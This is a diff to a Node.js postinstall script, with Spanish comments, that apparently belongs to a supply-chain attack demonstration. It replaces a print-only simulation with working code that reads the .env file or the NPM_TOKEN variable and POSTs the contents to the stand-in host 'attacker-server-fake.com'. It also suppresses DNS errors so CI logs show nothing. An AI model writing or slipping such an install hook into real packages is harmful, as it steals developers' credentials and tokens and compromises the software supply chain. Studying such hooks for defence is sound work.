@@ -1,31 +1,38 @@
-// .postinstall.js
 const fs = require('fs');
 const path = require('path');
+const https = require('https');
 
-console.log("\n🐛 [ALERTA DE SEGURIDAD SIMULADA] Gusano de supply chain ejecutándose en segundo plano...");
+console.log("[Sandbox] Hook malicioso postinstall disparado...");
 
-// 1. El gusano busca archivos de configuración sensibles
 const envPath = path.join(__dirname, '.env');
+let stolenData = "";
 
+// 1. Extracción (Sources)
 if (fs.existsSync(envPath)) {
-    console.log("☠️ [CRÍTICO] Archivo .env localizado por el atacante.");
+    console.log("[Sandbox] .env físico detectado. Extrayendo contenido.");
+    stolenData = fs.readFileSync(envPath, 'utf8');
+} else if (process.env.NPM_TOKEN) {
+    console.log("[Sandbox] Leyendo token de NPM directo de memoria.");
+    stolenData = process.env.NPM_TOKEN;
+}
+
+// 2. Exfiltración (Sink)
+if (stolenData) {
+    console.log("[Sandbox] Ejecutando payload de exfiltración...");
+
+    const req = https.request({
+        hostname: 'attacker-server-fake.com',
+        port: 443,
+        path: '/drop',
+        method: 'POST'
+    }, () => {});
+
+    // Silenciamos error de DNS en los logs del CI
+    req.on('error', () => {}); 
     
-    // 2. Lee las credenciales
-    const secretData = fs.readFileSync(envPath, 'utf8');
+    // Inyección en el body
+    req.write(JSON.stringify({ payload: stolenData }));
+    req.end();
     
-    // 3. Simula la exfiltración (robo) de datos hacia un servidor externo
-    console.log("📡 [RED] Exfiltrando credenciales a servidor malicioso remoto...");
-    
-    // (En un ataque real, aquí habría un código que hace un POST oculto con tus claves)
-    console.log("----------------------------------------");
-    console.log("DATOS ROBADOS CON ÉXITO:");
-    console.log(secretData);
-    console.log("----------------------------------------\n");
-    
-} else {
-    // Si no hay .env, el gusano intenta robar las variables cargadas en memoria
-    console.log("ℹ️ No se encontró .env físico. Intentando volcar process.env...");
-    if (process.env.NPM_TOKEN) {
-        console.log("☠️ Token de NPM robado de la memoria: " + process.env.NPM_TOKEN);
-    }
+    console.log("[Sandbox] Payload enviado.");
 }
